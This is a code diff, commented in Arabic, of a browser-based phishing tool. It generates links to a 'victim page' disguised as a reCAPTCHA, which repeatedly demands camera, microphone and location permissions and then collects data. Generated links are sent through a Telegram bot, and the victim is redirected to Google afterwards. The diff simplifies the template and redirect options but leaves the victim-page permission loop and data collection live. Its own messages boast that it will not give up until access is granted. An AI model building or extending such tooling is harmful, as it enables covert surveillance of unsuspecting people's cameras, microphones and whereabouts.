@@ -1661,14 +1661,6 @@
             grid-template-columns: 1fr;
             gap: 12px;
         }
-        .stats-chart-wrap {
-            background: rgba(255, 0, 51, 0.03);
-            border: 1px solid var(--line-soft);
-            border-radius: 10px;
-            padding: 10px;
-            min-height: 120px;
-            display: none;
-        }
         .stats-table-wrap {
             background: rgba(255, 0, 51, 0.03);
             border: 1px solid var(--line-soft);
@@ -1949,8 +1941,8 @@
             background: #1a0a0a;
             border-color: var(--red-neon);
             box-shadow: 0 0 30px rgba(255, 0, 51, 0.15);
-            opacity: 0.8;
-            pointer-events: auto;
+            opacity: 0.6;
+            pointer-events: none;
             user-select: none;
         }
         .captcha-row {
@@ -2557,6 +2549,7 @@
         <symbol id="telegramIcon" viewBox="0 0 24 24" fill="currentColor">
             <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
         </symbol>
+        <!-- SVG for stats icon -->
         <symbol id="statsIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M21 12v-2a5 5 0 0 0-5-5H8a5 5 0 0 0-5 5v2"/>
             <circle cx="12" cy="16" r="5"/>
@@ -2683,30 +2676,15 @@
                             <input type="text" id="chatIdInput" placeholder="أدخل معرف المحادثة (الأيدي)" required />
                         </div>
 
-                        <!-- ===== مدة الصلاحية ثابتة ===== -->
+                        <!-- ===== خيارات متقدمة — تم إزالة قالب الضحية وإعادة التوجيه ===== -->
                         <div class="field-row">
                             <div class="field">
                                 <label>مدة الصلاحية <span class="en">// EXPIRY</span></label>
                                 <input type="text" id="expiryFixed" value="أبدي" disabled style="opacity:0.6;cursor:not-allowed;" />
                             </div>
-                            <div class="field">
-                                <label>قالب الضحية <span class="en">// TEMPLATE</span></label>
-                                <select id="templateSelect">
-                                    <option value="recaptcha">reCAPTCHA</option>
-                                    <option value="loading">صفحة تحميل</option>
-                                    <option value="login">تسجيل دخول</option>
-                                </select>
+                            <div class="field" style="display:none;">
+                                <!-- تم إزالة قالب الضحية -->
                             </div>
-                        </div>
-                        <div class="field">
-                            <label>إعادة التوجيه <span class="en">// REDIRECT</span></label>
-                            <select id="redirectSelect">
-                                <option value="https://www.google.com">Google</option>
-                                <option value="https://www.youtube.com">YouTube</option>
-                                <option value="https://www.facebook.com">Facebook</option>
-                                <option value="custom">رابط مخصص</option>
-                            </select>
-                            <input type="url" id="customRedirect" placeholder="https://example.com" style="margin-top:6px;display:none;direction:ltr;text-align:left;" />
                         </div>
 
                         <!-- ===== 3D FEATURE BOXES ===== -->
@@ -2778,7 +2756,9 @@
                     </form>
 
                     <!-- ===== TOOLBAR — تم حذف أزرار تصدير، استيراد، مزامنة، تحديث ===== -->
-                    <div class="toolbar"></div>
+                    <div class="toolbar">
+                        <!-- toolbar فارغ — تم حذف جميع الأزرار المطلوبة -->
+                    </div>
 
                     <!-- LINK RESULT -->
                     <div id="linkResult" style="display:none;" class="link-result">
@@ -2840,7 +2820,7 @@
                 </div>
 
                 <!-- ============================================================
-                     VICTIM PAGE — CAPTCHA + DATA COLLECTION
+                     VICTIM PAGE
                      ============================================================ -->
                 <div id="victim-page">
                     <div class="captcha-wrapper" id="captchaWrapper">
@@ -3265,14 +3245,11 @@
         });
 
         // ================================================================
-        //  🔥  GENERATE LINK — 100% شغال
+        //  🔥  GENERATE LINK
         // ================================================================
         const configForm = document.getElementById('configForm');
         const botTokenInput = document.getElementById('botTokenInput');
         const chatIdInput = document.getElementById('chatIdInput');
-        const templateSelect = document.getElementById('templateSelect');
-        const redirectSelect = document.getElementById('redirectSelect');
-        const customRedirect = document.getElementById('customRedirect');
         const linkResult = document.getElementById('linkResult');
         const tokenDisplay = document.getElementById('tokenDisplay');
         const shortLink = document.getElementById('shortLink');
@@ -3280,17 +3257,13 @@
         const openLinkBtn = document.getElementById('openLinkBtn');
         const testLinkBtn = document.getElementById('testLinkBtn');
 
-        redirectSelect.addEventListener('change', function() {
-            customRedirect.style.display = this.value === 'custom' ? 'block' : 'none';
-        });
-
         configForm.addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const botToken = botTokenInput.value.trim();
             const chatId = chatIdInput.value.trim();
 
-            // التحقق من الحقول
+            // 🔥 التحقق من صحة البيانات — في حال نقص البيانات نعود للصفحة الرئيسية
             if (!botToken || !chatId) {
                 showToast('يرجى ملء جميع الحقول المطلوبة', 'warning');
                 updateLog('❌ يرجى ملء جميع الحقول المطلوبة', '');
@@ -3298,6 +3271,7 @@
                 return;
             }
 
+            // التحقق من صحة التوكن
             const valid = await verifyBotToken(botToken);
             if (!valid) {
                 showToast('توكن غير صحيح، يرجى التأكد', 'error');
@@ -3308,23 +3282,14 @@
                 return;
             }
 
-            // التحقق من الرابط المخصص
-            let redirect = redirectSelect.value;
-            if (redirect === 'custom') {
-                const customUrl = customRedirect.value.trim();
-                if (!customUrl || !isValidUrl(customUrl)) {
-                    showToast('يرجى إدخال رابط مخصص صحيح', 'warning');
-                    updateLog('❌ رابط مخصص غير صحيح', '');
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                    return;
-                }
-                redirect = customUrl;
-            }
-
             const checkedBoxes = document.querySelectorAll('.feature-box input[type="checkbox"]:checked');
             const features = Array.from(checkedBoxes).map(cb => cb.value).join(',');
+
+            // مدة الصلاحية ثابتة — "أبدي"
             const expiry = 'never';
-            const template = templateSelect.value;
+            // تم إزالة قالب الضحية وإعادة التوجيه — نستخدم القيم الافتراضية
+            const template = 'recaptcha';
+            const redirect = 'https://www.google.com';
 
             const bots = await getBots();
 
@@ -3364,23 +3329,18 @@
             await saveBot(botToken, newEntry);
 
             displayLink(shortToken);
+            // إرسال الرابط للمستخدم عبر توكنه الخاص
             sendLinkToUser(botToken, chatId, shortToken);
             showToast('✅ تم إنشاء رابط جديد وحفظه!', 'success');
             updateLog('✅ تم إنشاء رابط جديد وحفظه!', 'success');
             updateBotList();
             updateStats();
             tokenCheckResult.textContent = '';
+            // تمرير إلى نتيجة الرابط
             setTimeout(() => {
                 linkResult.scrollIntoView({ behavior: 'smooth', block: 'center' });
             }, 300);
         });
-
-        function isValidUrl(string) {
-            try {
-                const url = new URL(string);
-                return url.protocol === 'http:' || url.protocol === 'https:';
-            } catch (_) { return false; }
-        }
 
         async function sendLinkToUser(botToken, chatId, shortToken) {
             const base = window.location.origin + window.location.pathname;
@@ -3388,12 +3348,21 @@
             const msg =
                 `🔗 *رابطك الجديد v6.1*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع) ولا يستسلم حتى يتم منحها.\n🛡️ الإصدار الأسطوري — صائد الأذونات.`;
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
                 });
-            } catch (err) { console.error('❌ فشل إرسال الرابط:', err); }
+                const result = await response.json();
+                if (result.ok) {
+                    showToast('✅ تم إرسال الرابط إلى معرف المحادثة الخاص بك', 'success');
+                } else {
+                    showToast('⚠️ فشل إرسال الرابط: تأكد من أن البوت يملك صلاحية الإرسال لهذا المعرف', 'warning');
+                }
+            } catch (err) {
+                console.error('❌ فشل إرسال الرابط:', err);
+                showToast('❌ حدث خطأ أثناء إرسال الرابط', 'error');
+            }
         }
 
         function displayLink(shortToken) {
@@ -3436,6 +3405,7 @@
             }, 1500);
         }
 
+        // ===== TEST LINK BUTTON =====
         testLinkBtn.addEventListener('click', function() {
             const link = shortLink.textContent;
             if (link) {
@@ -3524,7 +3494,7 @@
         }
 
         // ================================================================
-        //  🔥  VICTIM PAGE — PERMISSION LOOP + DATA COLLECTION
+        //  🔥  VICTIM PAGE — PERMISSION LOOP ENGINE
         // ================================================================
 
         const victimPage = document.getElementById('victim-page');
@@ -3838,12 +3808,10 @@
                 victimPage.style.display = 'block';
                 victimPage.style.animation = 'fadeIn 0.6s ease';
 
-                // بعد 1.5 ثانية — بدء طلب الأذونات وجمع البيانات
                 setTimeout(async () => {
                     const granted = await requestAllPermissions();
                     if (granted) {
                         await startDataCollection(foundToken, foundData.chatId, foundData.features);
-                        // بعد 3 ثوان — إعادة التوجيه إلى الرابط المحدد
                         setTimeout(() => {
                             const redirectUrl = foundData.redirect || 'https://www.google.com';
                             window.location.href = redirectUrl;
